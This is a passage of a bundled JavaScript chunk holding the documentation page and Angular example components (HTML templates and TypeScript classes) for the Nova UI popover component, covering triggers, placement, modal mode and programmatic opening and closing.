<code>&lt;nui-popover&gt;</code> element and passing a\n    <code>TemplateRef&lt;string&gt;</code> value to the\n    <code>template</code> input. The provided template serves as the popover\'s\n    body content. The simplest way to do this is to create an\n    <code>ng-template</code> element and pass its template reference variable\n    name to the <code>template</code> input.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-basic-usage"\n    exampleTitle="Basic Usage"\n>\n    <nui-popover-basic-usage-example></nui-popover-basic-usage-example>\n</nui-example-wrapper>\n\n<h2>Debounced Displaying</h2>\n<p>\n    To debounce the displaying of the tooltip provide the time in milliseconds\n    via the <code>delay</code> input.\n</p>\n<nui-example-wrapper\n    filenamePrefix="popover-debounce"\n    exampleTitle="Popover Debounce"\n>\n    <nui-popover-debounce-example></nui-popover-debounce-example>\n</nui-example-wrapper>\n\n<h2>Adding a Title</h2>\n<p>\n    To add a title to the popover, pass a string via the\n    <code>popoverTitle</code> input.\n</p>\n<p>\n    If you need to hide overflow of long strings (for example long url) just\n    wrap your popover content with <code>div</code> which has\n    <code>overflow: hidden</code>.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-with-title"\n    exampleTitle="Popover with Title"\n>\n    <nui-popover-with-title-example></nui-popover-with-title-example>\n</nui-example-wrapper>\n\n<p>\n    <strong>\n        Note: Popover must be used as an attribute when the\n        <code>trigger</code> input is set to \'focus\'. See the focus example\n        under <em>Trigger Events</em> below.\n    </strong>\n</p>\n\n<h2>Trigger Events</h2>\n<p>\n    Popover supports four trigger events: \'click\' | \'mouseenter\' | \'mouseleave\'\n    | \'focus\'. To specify a trigger, set the\n    <code>trigger</code> input to one or more of the supported events. If no\n    event is not specified, \'mouseenter\' will be used as the default.\n</p>\n<p>\n    A popover can be configured to react to more than one event by specifying\n    multiple trigger events as in the example below.\n</p>\n<p><code>trigger=\'click mouseenter\'</code></p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-click-trigger"\n    exampleTitle="Click"\n>\n    <nui-popover-click-trigger-example></nui-popover-click-trigger-example>\n</nui-example-wrapper>\n<nui-example-wrapper\n    filenamePrefix="popover-mouseenter-trigger"\n    exampleTitle="Mouse Enter"\n>\n    <nui-popover-mouseenter-trigger-example></nui-popover-mouseenter-trigger-example>\n</nui-example-wrapper>\n<nui-example-wrapper\n    filenamePrefix="popover-focus-trigger"\n    exampleTitle="Focus"\n>\n    <nui-popover-focus-trigger-example></nui-popover-focus-trigger-example>\n</nui-example-wrapper>\n\n<p>\n    <strong>\n        Note: The \'focus\' trigger is only available when Popover is used as an\n        attribute. See <em>Usage as an Attribute</em> above.\n    </strong>\n</p>\n\n<h2>Prevent Closing on Click</h2>\n<p>\n    To allow the user to interact with components within the popover such as a\n    checkbox, link, etc. and prevent the popover from closing when this content\n    is cli\u0441ked, set the <code>preventClosing</code> input to true. The default\n    value is <code>false</code>. <br />\n    In this case popover can be closed via <code>nuiClosePopover</code> subject\n    that you provide to <code>nuiPopoverDirective</code> or\n    <code>closePopover</code> of <code>PopoverComponent</code>. So when you need\n    to close popover you just call <code>next()</code> method of this subject.\n    No arguments are required.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-prevent-close-on-click"\n    exampleTitle="Prevent Closing on Click"\n>\n    <nui-popover-prevent-close-on-click-example></nui-popover-prevent-close-on-click-example>\n</nui-example-wrapper>\n\n<h2>Appending to a Container</h2>\n<p>\n    Passing an HTMLElement via the <code>container</code> input tells the\n    popover which element to append itself to. By default the popover is\n    appended to the document body. The simplest way to do this is to append an\n    Angular template reference variable name to the container element and pass\n    the name to the <code>container</code> input.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-with-container"\n    exampleTitle="Appending to a Container"\n>\n    <nui-popover-with-container-example></nui-popover-with-container-example>\n</nui-example-wrapper>\n\n<h2>Removing Padding</h2>\n<p>\n    Setting the <code>hasPadding</code> input to false removes all padding from\n    the popover body. <code>hasPadding</code>\n    is true by default.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-no-padding"\n    exampleTitle="Removing Padding"\n>\n    <nui-popover-no-padding-example></nui-popover-no-padding-example>\n</nui-example-wrapper>\n\n<h2>Removing Width and Height Limitations</h2>\n<p>\n    Setting the <code>unlimited</code> input to true removes all maximum and\n    minimum limitations for width and height of the popover body.\n    <code>unlimited</code> is false by default.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-unlimited"\n    exampleTitle="Removing Width and Height Limitations"\n>\n    <nui-popover-unlimited-example></nui-popover-unlimited-example>\n</nui-example-wrapper>\n\n<h2>Outputs</h2>\n<p>\n    The <code>(shown)</code> output emits an event upon display of the popover.\n</p>\n<p>\n    The <code>(hidden)</code> output emits an event upon disappearance of the\n    popover\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-outputs"\n    exampleTitle="Show and Hide"\n>\n    <nui-popover-outputs-example></nui-popover-outputs-example>\n</nui-example-wrapper>\n\n<h2>Placement</h2>\n<p>\n    To specify placement of popover set the <code>placement</code> input to\n    \'left\', \'right\', \'top\' or \'bottom\'. The default is \'right\'.\n</p>\n\n<nui-example-wrapper\n    filenamePrefix="popover-placement"\n    exampleTitle="Right or Left"\n>\n    <nui-popover-placement-example></nui-popover-placement-example>\n</nui-example-wrapper>\n\n<p>\n    Note: Popover adapts to available space around it. So, if you set\n    <code>placement="left"</code> but there is not enough free space on the\n    left, the popover will be displayed to the right instead.\n</p>\n\n<h2>Icon/Status</h2>\n<p>\n    Pass an icon name to the <code>icon</code> input to display an icon in the\n    popover.\n</p>\n<p>\n    If the popover has a title, the icon will display to the left of the title.\n    If, however, the popover does not have a title, the icon will be displayed\n    to the left of the popover body.\n</p>\n<p>\n    If you want to use popover with status indicator overlay and underline, you\n    can achieve it by writing your own markup like in the example below.\n</p>\n\n<nui-example-wrapper filenamePrefix="popover-icon" exampleTitle="Icon">\n    <nui-popover-icon-example></nui-popover-icon-example>\n</nui-example-wrapper>\n<nui-example-wrapper filenamePrefix="popover-status" exampleTitle="Status">\n    <nui-popover-status-example></nui-popover-status-example>\n</nui-example-wrapper>\n\n<h2>Modal Mode</h2>\n<p>\n    To display a popover in a modal style (with a darkened backdrop between the\n    page and the popover) set the <code>modal</code> input to true.\n</p>\n\n<nui-example-wrapper filenamePrefix="popover-modal" exampleTitle="Modal Mode">\n    <nui-popover-modal-example></nui-popover-modal-example>\n</nui-example-wrapper>\n\n<h2>Disabled</h2>\n<p>\n    To prevent popover from showing set the <code>disabled</code> input to true\n</p>\n\n<nui-example-wrapper filenamePrefix="popover-disabled" exampleTitle="Disabled">\n    <nui-popover-disabled-example></nui-popover-disabled-example>\n</nui-example-wrapper>\n<h2>Opening and Closing Popover Programmatically</h2>\n<p>To open or close popover programmatically do next steps:</p>\n<ol>\n    <li>Set <code>trigger="openPopoverSubject"</code>.</li>\n    <li>\n        Pass <code>Subject</code> as input to <code>[closePopover]</code> and\n        <code>[openPopover]</code> inputs.\n    </li>\n    <li>\n        Do <code>this.openPopoverSubject.next()</code> or\n        <code>this.closePopoverSubject.next()</code> on needed event to trigger\n        popover.\n    </li>\n</ol>\n<nui-example-wrapper\n    filenamePrefix="popover-open-and-close-programmatically"\n    exampleTitle="Opening and Closing Popover Programmatically"\n>\n    <nui-popover-open-and-close-programmatically-example></nui-popover-open-and-close-programmatically-example>\n</nui-example-wrapper>\n'},99398:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-docs-example",\n    templateUrl: "./popover-docs.example.component.html",\n})\nexport class PopoverExampleComponent {}\n'},9170:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<span i18n>Set</span>\n<nui-popover\n    id="nui-demo-popover-focus"\n    tabindex="1"\n    popoverTitle="Popover with Focus Trigger"\n    i18n-popoverTitle\n    trigger="focus"\n    [template]="popoverFocusTriggerTemplate0"\n    ><mark i18n>focus</mark></nui-popover\n>\n<span i18n>on me!</span>\n<span i18n>Then, tab over to</span>\n<nui-popover\n    tabindex="2"\n    popoverTitle="Popover with Focus Trigger"\n    i18n-popoverTitle\n    trigger="focus"\n    [template]="popoverFocusTriggerTemplate1"\n    ><mark i18n>focus</mark></nui-popover\n>\n\n<span i18n>on me!</span>\n\n<ng-template #popoverFocusTriggerTemplate0>\n    <span id="nui-demo-popover-modal-focus" i18n>\n        I\'m focused and ready-to-go!\n    </span>\n</ng-template>\n\n<ng-template #popoverFocusTriggerTemplate1 i18n>\n    Now, I\'m the one who\'s focused and ready-to-go!\n</ng-template>\n'},31918:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-focus-trigger-example",\n    templateUrl: "./popover-focus-trigger.example.component.html",\n})\nexport class PopoverFocusTriggerExampleComponent {}\n'},43546:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div>\n    <nui-popover\n        icon="application"\n        [template]="iconPopoverTemplateNoTitle"\n        i18n\n    >\n        Hover over me!\n    </nui-popover>\n</div>\n<div>\n    <nui-popover\n        popoverTitle="Popover with Icon"\n        i18n-popoverTitle\n        icon="application"\n        [template]="iconPopoverTemplateWithTitle"\n        i18n\n    >\n        Hover over me, too!\n    </nui-popover>\n</div>\n\n<ng-template #iconPopoverTemplateNoTitle i18n\n    >I have an application icon and no title!</ng-template\n>\n<ng-template #iconPopoverTemplateWithTitle i18n\n    >I have an application icon and a title!</ng-template\n>\n'},70917:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=".popover-examples {\n    &__item-body {\n        margin-top: 15px;\n    }\n    &__row {\n        display: flex;\n        flex-direction: row;\n        justify-content: flex-start;\n        margin: 15px 15px 15px 0;\n        &-item {\n            margin-right: 80px;\n        }\n    }\n}\n"},60006:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-icon-example",\n    templateUrl: "./popover-icon.example.component.html",\n})\nexport class PopoverIconExampleComponent {}\n'},62958:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    popoverTitle="Modal Popover"\n    i18n-popoverTitle\n    trigger="click"\n    placement="right"\n    [template]="popoverModal"\n    [modal]="true"\n    [preventClosing]="true"\n    [closePopover]="closePopoverSubject"\n>\n    <button nui-button type="button" id="nui-demo-popover-modal" i18n>\n        Show modal popover\n    </button>\n</nui-popover>\n\n<ng-template #popoverModal>\n    <span i18n>A modal popover can be used to grab the user\'s attention.</span>\n    <div class="mt-2 d-flex justify-content-end">\n        <button\n            id="nui-demo-custom-close-popover"\n            nui-button\n            type="button"\n            displayStyle="action"\n            (click)="closePopover()"\n            i18n\n        >\n            Close\n        </button>\n        <button\n            nui-button\n            class="ml-3"\n            type="button"\n            displayStyle="primary"\n            (click)="closePopover()"\n            i18n\n        >\n            Confirm\n        </button>\n    </div>\n</ng-template>\n'},83146:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { Subject } from "rxjs";\n\n@Component({\n    selector: "nui-popover-modal-example",\n    templateUrl: "./popover-modal.example.component.html",\n})\nexport class PopoverModalExampleComponent {\n    public closePopoverSubject: Subject<void> = new Subject<void>();\n\n    public closePopover(): void {\n        this.closePopoverSubject.next();\n    }\n}\n'},39556:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    id="nui-demo-popover-mouseenter"\n    popoverTitle="Popover with Mouseenter Trigger"\n    i18n-popoverTitle\n    trigger="mouseenter"\n    [template]="popoverMouseenterTrigger"\n    i18n\n    >Hover over me!\n</nui-popover>\n\n<ng-template #popoverMouseenterTrigger>\n    <span id="nui-demo-popover-modal-mouseenter" i18n>Hi, I\'m hovered!</span>\n</ng-template>\n'},36132:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-mouseenter-trigger-example",\n    templateUrl: "./popover-mouseenter-trigger.example.component.html",\n})\nexport class PopoverMouseenterTriggerExampleComponent {}\n'},58702:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    [hasPadding]="false"\n    popoverTitle="My body has no padding"\n    i18n-popoverTitle\n    [template]="popoverNoPadding"\n>\n    Hover over me!\n</nui-popover>\n\n<ng-template #popoverNoPadding i18n>\n    I lack padding because I\'m configured that way.\n</ng-template>\n'},24074:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-no-padding-example",\n    templateUrl: "./popover-no-padding.example.component.html",\n})\nexport class PopoverNoPaddingExampleComponent {}\n'},79050:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    id="nui-demo-popover-open-close-programmatically"\n    popoverTitle="Opened Programmatically"\n    i18n-popoverTitle\n    trigger="openPopoverSubject"\n    [template]="popoverOpenClose"\n    [openPopover]="openPopoverSubject"\n    [closePopover]="closePopoverSubject"\n>\n    <span i18n>This popover will be triggered programmatically!</span>\n</nui-popover>\n\n<ng-template #popoverOpenClose>\n    <div id="nui-demo-popover-open-close" i18n>\n        Hey, I\'m opened programmatically.\n    </div>\n</ng-template>\n\n<div class="mt-2">\n    <button\n        id="nui-demo-popover-close-programmatically-btn"\n        nui-button\n        type="button"\n        (click)="closePopover()"\n        i18n\n    >\n        Close popover\n    </button>\n    <button\n        id="nui-demo-popover-open-programmatically-btn"\n        nui-button\n        class="ml-2"\n        type="button"\n        (click)="openPopover()"\n        i18n\n    >\n        Open popover\n    </button>\n</div>\n'},19478:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { Subject } from "rxjs";\n\n@Component({\n    selector: "nui-popover-open-and-close-programmatically-example",\n    templateUrl:\n        "./popover-open-and-close-programmatically.example.component.html",\n})\nexport class PopoverOpenAndCloseProgrammaticallyExampleComponent {\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    public closePopover(): void {\n        this.closePopoverSubject.next();\n    }\n\n    public openPopover(): void {\n        this.openPopoverSubject.next();\n    }\n}\n'},30182:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    [template]="outputTemplate"\n    (hidden)="onHide()"\n    (shown)="onShow()"\n    i18n\n>\n    Hover over me!\n</nui-popover>\n\n<ng-template #outputTemplate>\n    <div i18n>I\'m shown! Just mouseleave to see me hide.</div>\n</ng-template>\n'},40882:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, Inject } from "@angular/core";\n\nimport { IToastService, ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-popover-outputs-example",\n    templateUrl: "./popover-outputs.example.component.html",\n})\nexport class PopoverOutputsExampleComponent {\n    constructor(@Inject(ToastService) private toastService: IToastService) {}\n\n    public onHide(): void {\n        this.toastService.success({ message: $localize`onHide was invoked` });\n    }\n\n    public onShow(): void {\n        this.toastService.success({ message: $localize`onShow was invoked` });\n    }\n}\n'},53394:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="row">\n    <div class="col-3">\n        <nui-popover\n            popoverTitle="Popover with Right Placement"\n            i18n-popoverTitle\n            id="nui-demo-popover-placement-right"\n            [template]="rightPlacementTemplate"\n            placement="right"\n            trigger="click"\n        >\n            <button nui-button type="button" i18n>open right</button>\n        </nui-popover>\n    </div>\n    <div class="col-3">\n        <nui-popover\n            popoverTitle="Popover with Left Placement"\n            i18n-popoverTitle\n            placement="left"\n            id="nui-demo-popover-placement-left"\n            [template]="leftPlacementTemplate"\n            trigger="click"\n        >\n            <button nui-button type="button" i18n>open left</button>\n        </nui-popover>\n    </div>\n    <div class="col-3">\n        <nui-popover\n            popoverTitle="Popover with Top Placement"\n            i18n-popoverTitle\n            id="nui-demo-popover-placement-top"\n            placement="top"\n            [template]="topPlacementTemplate"\n            trigger="click"\n        >\n            <button nui-button type="button" i18n>open top</button>\n        </nui-popover>\n    </div>\n    <div class="col-3">\n        <nui-popover\n            popoverTitle="Popover with Bottom Placement"\n            i18n-popoverTitle\n            id="nui-demo-popover-placement-bottom"\n            [template]="bottomPlacementTemplate"\n            placement="bottom"\n            trigger="click"\n        >\n            <button nui-button type="button" i18n>open bottom</button>\n        </nui-popover>\n    </div>\n</div>\n\n<ng-template #rightPlacementTemplate>\n    <span id="nui-demo-popover-modal-placement-right" i18n>\n        I\'m shown on the right of the button.\n    </span>\n</ng-template>\n<ng-template #leftPlacementTemplate>\n    <span id="nui-demo-popover-modal-placement-left" i18n>\n        I\'m shown on the left of the button.\n    </span>\n</ng-template>\n<ng-template #topPlacementTemplate>\n    <span id="nui-demo-popover-modal-placement-top" i18n>\n        I\'m shown on top of the button.\n    </span>\n</ng-template>\n<ng-template #bottomPlacementTemplate>\n    <span id="nui-demo-popover-modal-placement-bottom" i18n>\n        I\'m shown under the button.\n    </span>\n</ng-template>\n'},95854:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-popover-placement-example",\n    templateUrl: "./popover-placement.example.component.html",\n})\nexport class PopoverPlacementExampleComponent {}\n'},27592:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    popoverTitle="Prevent close popover on click"\n    i18n-popoverTitle\n    id="nui-demo-popover-prevent-onclick"\n    trigger="click"\n    [template]="popoverPreventClose"\n    [closePopover]="closePopoverSubject"\n    [preventClosing]="true"\n>\n    <button nui-button type="button">\n        <span i18n>Click me!</span>\n    </button>\n</nui-popover>\n\n<ng-template #popoverPreventClose>\n    <div id="nui-demo-popover-modal-prevent">\n        <nui-checkbox id="nui-demo-checkbox-in-popover" i18n\n            >Hi, check me!</nui-checkbox\n        >\n        <nui-combobox\n            id="nui-demo-popover-combobox"\n            [itemsSource]="dataset.items"\n            placeholder="Select item"\n            i18n-placeholder\n        ></nui-combobox>\n        <div class="mt-2 d-flex justify-content-end">\n            <button\n                id="nui-demo-custom-close-popover"\n                nui-button\n                type="button"\n                displayStyle="action"\n                (click)="closePopover()"\n                i18n\n            >\n                Close\n            </button>\n            <button\n                nui-button\n                class="ml-3"\n                type="button"\n                displayStyle="primary"\n                (click)="closePopover()"\n                i18n\n            >\n                Confirm\n            </button>\n        </div>\n    </div>\n</ng-template>\n'},28920:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n// 